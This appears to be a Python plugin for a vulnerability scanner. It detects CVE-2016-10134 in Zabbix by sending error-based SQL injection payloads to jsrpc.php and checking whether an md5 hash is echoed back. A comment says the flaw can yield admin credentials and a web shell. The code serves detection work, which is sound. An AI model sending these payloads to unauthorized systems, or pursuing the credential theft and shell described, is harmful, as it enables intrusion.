#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import md5, random_int_1

cve_2016_10134_payloads = [
    {'path': 'jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7c,md5({NUM})),0)'},
    {'path': 'jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,md5({NUM})),0)'},
]

def cve_2016_10134_scan(clients):
    ''' latest.php中的toggle_ids[] 或 jsrpc.php中的profieldx2参数
            存在sql注入, 通过sql注入获取管理员账户密码, 进入后台进行getshell操作
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Zabbix',
        'vul_type': 'SQLinject',
        'vul_id': 'CVE-2016-10134',
    }

    for payload in cve_2016_10134_payloads:
        random_num = random_int_1()                # * 随机数字

        path = payload['path'].format(NUM=random_num)

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        md = md5(str(random_num), 31)   # * 计算随机数字的md5值, 取31位(0-30)

        if (md in res.text):            # * 如果计算的md5值, 在响应包的回显中找到了, 说明SQL注入的md5()函数执行了, 存在漏洞
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
